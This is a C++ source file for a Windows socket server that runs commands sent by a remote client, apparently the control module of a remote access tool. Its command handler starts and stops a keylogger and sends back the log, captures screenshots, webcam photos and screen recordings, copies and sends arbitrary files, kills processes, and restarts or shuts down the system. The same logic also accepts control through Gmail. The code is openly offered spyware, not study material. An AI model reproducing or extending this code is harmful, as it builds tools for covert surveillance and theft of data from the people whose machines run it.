#include "../includes/tasks.h"

namespace fs = std::filesystem;
const std::string script_dir = fs::current_path().parent_path().string() + "/scripts/";
const std::string exe_dir = fs::current_path().string() + "/";

void receiveResponse(SOCKET clientSock)
{
    char buffer[1024];
    int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0)
    {
        std::cerr << "Failed to receive response from client." << std::endl;
        return;
    }
    buffer[len] = '\0'; // Null-terminate the string
    std::cout << "Received response: " << buffer << std::endl;
}

void receiveFile(SOCKET sock)
{
    uint32_t nameLen;
    if (recv(sock, reinterpret_cast<char*>(&nameLen), sizeof(nameLen), 0) != sizeof(nameLen))
    {
        std::cerr << "Failed to receive filename length." << std::endl;
        return;
    }
    char* nameBuf = new char[nameLen + 1];
    if (recv(sock, nameBuf, nameLen, 0) != nameLen)
    {
        std::cerr << "Failed to receive filename." << std::endl;
        delete[] nameBuf;
        return;
    }

    nameBuf[nameLen] = '\0'; // Null-terminate the filename
    std::string filename = "received_" + std::string(nameBuf);
    delete[] nameBuf;

    uint32_t fileSize;
    if (recv(sock, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0) != sizeof(fileSize))
    {
        std::cerr << "Failed to receive file size." << std::endl;
        return;
    }
    if (fileSize == 0)
    {
        std::cout << "No file content received." << std::endl;
        return;
    }

    std::ofstream outFile(filename, std::ios::binary);
    if (!outFile.is_open())
    {
        std::cerr << "Failed to open file for writing: " << filename << std::endl;
        return;
    }
    char buffer[4096];
    int received = 0;

    while (received < fileSize)
    {
        int chunk = recv(sock, buffer, std::min((int)sizeof(buffer), (int)(fileSize - received)), 0);
        if (chunk <= 0)
        {
            std::cerr << "Failed to receive file content." << std::endl;
            outFile.close();
            return;
        }
        outFile.write(buffer, chunk);
        received += chunk;
    }
    outFile.close();
    std::cout << "File received and saved as: " << filename << std::endl;
    std::cout << "File content received from client." << std::endl;
}

void startSocketServer()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return;
    }

    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return;
    }
    std::cout << "Client connected." << std::endl;

    // receive initial response from client
    char buffer[1024];
    while (true)
    {
        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) 
        {
            std::cout << "Client disconnected." << std::endl;
            break;
        }

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command from client: " << cmd << std::endl;

        // Handle the command
        handleCommand(clientSock, cmd);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();
}

void sendResponse(SOCKET sock, const std::string& msg)
{
    if (sock != INVALID_SOCKET)
    {
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else
    {
        std::cout << "[Gmail Response]" << msg << std::endl;
    }
}

bool sendFileToClient(SOCKET sock, const std::string& filePath)
{
    if (sock == INVALID_SOCKET)
    {
        return false;
    }

    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return false;
    }

    // Get filename from path
    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
    
    // Send filename length
    uint32_t nameLen = filename.size();
    if (send(sock, reinterpret_cast<const char*>(&nameLen), sizeof(nameLen), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send filename length: " << WSAGetLastError() << std::endl;
        file.close();
        return false;
    }
    
    // Send filename
    if (send(sock, filename.c_str(), nameLen, 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send filename: " << WSAGetLastError() << std::endl;
        file.close();
        return false;
    }

    // Get file size
    file.seekg(0, std::ios::end);
    uint32_t fileSize = static_cast<uint32_t>(file.tellg());
    file.seekg(0, std::ios::beg);

    // Send file size
    if (send(sock, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send file size: " << WSAGetLastError() << std::endl;
        file.close();
        return false;
    }

    // Send file content in chunks
    char buffer[4096];
    while (!file.eof())
    {
        file.read(buffer, sizeof(buffer));
        std::streamsize bytesRead = file.gcount();
        if (bytesRead > 0)
        {
            if (send(sock, buffer, static_cast<int>(bytesRead), 0) == SOCKET_ERROR)
            {
                std::cerr << "Failed to send file content: " << WSAGetLastError() << std::endl;
                file.close();
                return false;
            }
        }
    }
    
    file.close();
    std::cout << "File sent successfully to client: " << filePath << std::endl;
    return true;
}

void handleCommand(SOCKET sock, const std::string& cmd)
{
    if (cmd == "help")
    {
        std::string helpMsg = 
            "Available commands:\n"
            "  help                    - Show this help message\n"
            "  list_services           - List all running services and send file to client\n"
            "  start <path>            - Start a process from given path\n"
            "  stop <process_name>     - Stop a process by name\n"
            "  list_apps               - List all visible applications and send file to client\n"
            "  copyfile <source>       - Copy file from source and send to client\n"
            "  start_keylogger         - Start keylogger\n"
            "  stop_keylogger          - Stop keylogger and send log file to client\n"
            "  screenshot              - Capture screen, save as PNG and send to client\n"
            "  webcam_photo            - Capture webcam photo and send to client\n"
            "  restart                 - Restart the system\n"
            "  shutdown                - Shutdown the system\n"
            "  start_record            - Start screen recording\n"
            "  stop_record             - Stop screen recording and send file to client\n"
            "  gmail_control           - Control by Gmail\n"
            "  exit                    - Disconnect from server\n";
        sendResponse(sock, helpMsg);
    }
    else if (cmd == "list_services")
    {
        std::string processes = listProcesses();
        std::string filename = "process_list.txt";
        sendResponse(sock, processes);
        
        // Send the process list file to client if it exists
        if (fileExists(filename))
        {
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Process list file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send process list file to client.";
                sendResponse(sock, errorMsg);
            }
        }
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        bool ok = startProcess(path);
        
        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
        sendResponse(sock, msg);
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string name = cmd.substr(5);
        bool ok = stopProcess(name);
        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
        sendResponse(sock, msg);
    }
    else if (cmd == "list_apps")
    {
        std::string apps = listUserApps();
        std::string filename = "list_apps.txt";
        sendResponse(sock, apps);
        
        // Send the apps list file to client if it exists
        if (fileExists(filename))
        {
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Apps list file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send apps list file to client.";
                sendResponse(sock, errorMsg);
            }
        }
    }
    else if (cmd.rfind("copyfile ", 0) == 0)
    {
        std::string sourcePath = cmd.substr(9);
        std::string destPath = fs::current_path().string() + "/" + fs::path(sourcePath).filename().string();
        
        bool ok = copyFile(sourcePath, destPath);
        if (ok)
        {
            std::string msg = "File copied successfully: " + destPath;
            sendResponse(sock, msg);
            
            // Send the copied file to client
            if (sendFileToClient(sock, destPath))
            {
                std::cout << "Copied file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send copied file to client.";
                sendResponse(sock, errorMsg);
            }
        }
        else
        {
            std::string msg = "Failed to copy file.";
            sendResponse(sock, msg);
        }
    }
    else if (cmd == "exit")
    {
        std::string msg = "Disconnecting from server...";
        sendResponse(sock, msg);
        closesocket(sock);
        return;
    }
    else if (cmd == "start_keylogger")
    {
        startKeylogger();
        std::string msg = "Keylogger started.";
        sendResponse(sock, msg);
    }
    else if (cmd == "stop_keylogger")
    {
        stopKeylogger();
        std::string filename = "keylog.txt";
        std::string msg = "Keylogger stopped.";
        sendResponse(sock, msg);
        
        // Send the keylog file to client if it exists
        if (fileExists(filename))
        {
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Keylog file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send keylog file to client.";
                sendResponse(sock, errorMsg);
            }
        }
        else
        {
            std::string errorMsg = "No keylog file found.";
            sendResponse(sock, errorMsg);
        }
    }
    else if (cmd == "screenshot")
    {
        std::string filename = "screenshot.png"; // Default filename
        
        bool success = captureScreen(filename);
        if (success)
        {
            std::string msg = "Screenshot captured successfully: " + filename;
            sendResponse(sock, msg);
            
            // Send the screenshot file to client
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Screenshot file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send screenshot file to client.";
                sendResponse(sock, errorMsg);
            }
        }
        else
        {
            std::string msg = "Failed to capture screenshot.";
            sendResponse(sock, msg);
        }
    }
    else if (cmd == "restart")
    {
        std::string msg = "Initiating system restart...";
        sendResponse(sock, msg);
        
        Sleep(1000);
        
        bool success = restartSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to restart system.";
            sendResponse(sock, errorMsg);
        }
    }
    else if (cmd == "shutdown")
    {
        std::string msg = "Initiating system shutdown...";
        sendResponse(sock, msg);
        
        Sleep(1000);
        
        bool success = shutdownSystem();
        if (!success)
        {
            std::string errorMsg = "Failed to shutdown system.";
            sendResponse(sock, errorMsg);
        }
    }
    else if (cmd == "webcam_photo")
    {
        std::string filename = "webcam_photo.jpg"; // Default filename
        bool success = captureWebcamPhoto(filename);
        if (success)
        {
            std::string msg = "Webcam photo captured successfully: " + filename;
            sendResponse(sock, msg);
            
            // Send the webcam photo to client
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Webcam photo sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send webcam photo to client.";
                sendResponse(sock, errorMsg);
            }
        }
        else
        {
            std::string msg = "Failed to capture webcam photo.";
            sendResponse(sock, msg);
        }
    }
    else if(cmd == "start_record")
    {
        if (!isRecording())
        {
            std::string filename = "screen_recording.avi"; // Default filename
            startScreenRecording(filename);
            std::string msg = "Screen recording started: " + filename;
            sendResponse(sock, msg);
        }
        else
        {
            std::string msg = "Screen recording is already in progress.";
            sendResponse(sock, msg);
        }
    }
    else if (cmd == "stop_record")
    {
        if (isRecording())
        {
            stopScreenRecording();
            std::string filename = "screen_recording.avi";
            std::string msg = "Screen recording stopped.";
            sendResponse(sock, msg);
            
            // Send the recording file to client
            if (sendFileToClient(sock, filename))
            {
                std::cout << "Recording file sent to client." << std::endl;
            }
            else
            {
                std::string errorMsg = "Failed to send recording file to client.";
                sendResponse(sock, errorMsg);
            }
        }
        else
        {
            std::string msg = "No screen recording in progress.";
            sendResponse(sock, msg);
        }
    }
    else if (cmd == "gmail_control")
    {
        std::string msg = "Starting Gmail control loop...";
        sendResponse(sock, msg);
        
        startGmailControlLoop();
        
        // After the loop ends, send a final message to the client
        msg = "Gmail control loop stopped.";
        sendResponse(sock, msg);
    }
    else
    {
        std::string msg = "Unknown command: " + cmd;
        sendResponse(sock, msg);
    }
}

int main()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }
    sockaddr_in serverAddr = {AF_INET, htons(12345), INADDR_ANY};
    if (bind(serverSock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    listen(serverSock, 1);
    std::cout << "Server is listening on port 12345..." << std::endl;

    SOCKET clientSock = accept(serverSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        closesocket(serverSock);
        WSACleanup();
        return 1;
    }
    std::cout << "Client connected." << std::endl;

    char buffer[1024];
    while (true)
    {
        // receive initial response from client
        int len = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) 
        {
            std::cout << "Client disconnected." << std::endl;
            break;
        }

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command from client: " << cmd << std::endl;
        
        // Handle the command
        handleCommand(clientSock, cmd);
    }

    closesocket(clientSock);
    closesocket(serverSock);
    WSACleanup();

    return 0;
}